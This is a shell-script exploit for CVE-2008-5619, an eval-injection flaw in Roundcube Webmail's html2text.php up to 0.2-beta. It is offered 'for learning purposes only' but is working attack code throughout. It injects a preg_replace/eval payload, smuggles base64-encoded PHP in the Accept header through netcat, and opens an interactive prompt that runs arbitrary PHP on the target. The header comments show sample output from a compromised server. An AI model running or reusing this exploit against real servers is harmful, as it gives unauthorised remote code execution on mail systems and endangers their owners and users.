#!/bin/sh
#
# I was hoping the PoC would not appear so soon,
# but now that it is out,
# i thought i might as well publish my real exploit.
#
# Hunger
#
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5619
#
# FOR LEARNING PURPOSES ONLY!
#
# PHP> echo(ini_get('disable_functions'));
#
# exec, system
#
# PHP> passthru("id; uname -a");
#
# uid=666(www-data) gid=666(www-data) groups=666(www-data)
# Linux mail 2.6.28 #0 Sun Jan 01 10:05:33 CET 2009 i686 GNU/Linux
#

echo  'Exploit for Roundcube Webmail =< 0.2-beta'
echo  'html2text.php / preg_replace() / eval bug'
echo -e '\r\nby Hunger <rch2tex@hunger.hu>\r\n\n'

if [ "$2" = "" ]; then echo "
Usage:
$0 <hostname> <deeplink>

Example:
\$ $0 localhost /roundcube/bin/html2text.php


For https sites use stunnel or socat!
"; exit 1; fi

NETCATEXE=`which nc`
BASE64ENC=`which base64`

if [ "$NETCATEXE" = "" ] || [ "$BASE64ENC" = "" ]; 
then
   echo "Required tool(s) missing... (netcat, base64)"
   exit 2
fi

USERAGENT="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2)"

MYPAYLOAD="{\${EVAL(BASE64_DECODE(\$_SERVER[HTTP_ACCEPT]))}}"
EVALEDTAG="<b>"
EVALEDTAG=$EVALEDTAG$MYPAYLOAD
EVALEDTAG=$EVALEDTAG"</b>"

PARAMSIZE=54

HOST_NAME=$1
DEEP_LINK=$2
HTTP_PORT=80

HTTPHEADR=""
HTTPHEADR=$HTTPHEADR"POST $DEEP_LINK HTTP/1.0\r\n"
HTTPHEADR=$HTTPHEADR"Host: $HOST_NAME\r\n"
HTTPHEADR=$HTTPHEADR"User-Agent: $USERAGENT\r\n"
HTTPHEADR=$HTTPHEADR"Content-length: $PARAMSIZE\r\n"
HTTPHEADR=$HTTPHEADR"Accept:"

SPLOITCHK='Succeeded! :))'
PHPAYLOAD='echo("'
PHPAYLOAD=$PHPAYLOAD$SPLOITCHK'\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'Type PHP functions as shell commands. ;)\r\n'
PHPAYLOAD=$PHPAYLOAD'Use \"exit\" to close session.\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'Good luck and have phun! ;D\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'")'

HTTPOKMSG="HTTP/1.0 200 OK"
HTTP1KMSG="HTTP/1.1 200 OK"
RETURNCHR=`echo -e "\r\n"`

echo -n "Trying to exploit... "

f=0; until [ "$PHPAYLOAD" = "exit" ]; do
 PHPAYLOAD=`echo "$PHPAYLOAD;" |$BASE64ENC --wrap=0`
 HTTP_SEND="$HTTPHEADR $PHPAYLOAD\r\n\r\n$EVALEDTAG"
 HTTP_BACK=`echo -ne "$HTTP_SEND"|$NETCATEXE $HOST_NAME $HTTP_PORT`
 if [ $? != 0 ]; then echo "Connection failed."; exit 3; fi
 e=0; l=0; echo "$HTTP_BACK" | while read i; do let l++;
   if [ $l = 1 ] && [ "$i" != "$HTTPOKMSG$RETURNCHR" ] \
                 && [ "$i" != "$HTTP1KMSG$RETURNCHR" ]; then
      echo "Bad Server Response :\\"; exit 4; fi;
   if [ $e = 1 ] && [ $f = 0 ] && [ "$i" = "$MYPAYLOAD" ]; then
      echo "Target has been patched /o\\"; exit 4; fi
   if [ $e = 1 ] && [ $f = 0 ] && [ "$i" != "$SPLOITCHK$RETURNCHR" ]; then
      echo -e "Exploitation failed :(("; exit 4; elif
         [ "$i" = "$SPLOITCHK$RETURNCHR" ]; then let f++; fi
   if [ $e -gt 0 ]; then echo "$i"; fi
   if [ "$i" = "$RETURNCHR" ]; then let e++; fi
 done
 if [ $? != 4 ]; then let f++; echo -ne "PHP> "; else
  echo -e "\n\nDump:\n\n$HTTP_BACK"; exit 4; fi;
 read PHPAYLOAD
done